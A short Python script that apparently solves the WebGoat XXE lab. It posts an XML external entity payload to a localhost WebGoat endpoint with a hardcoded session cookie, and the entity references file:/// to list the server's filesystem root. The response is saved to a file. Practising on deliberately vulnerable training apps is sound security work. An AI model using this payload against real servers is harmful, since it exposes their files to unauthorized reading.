import requests

base_url = "http://127.0.0.1:8080"
relative_url = "/WebGoat/xxe/simple"
cookie = {"JSESSIONID":"989CC4A31FF888131A56EF470F393DB8"}

xml = '<?xml version="1.0"?> <!DOCTYPE comment [ <!ENTITY rootpath SYSTEM "file:///"> ]> <comment><text>&rootpath;</text></comment>'
headers = {'Content-Type': 'text/xml'}

url = base_url + relative_url

r = requests.post(url, data=xml, headers = headers, cookies=cookie)
with open("result.txt", 'w') as file:
    file.write(r.text)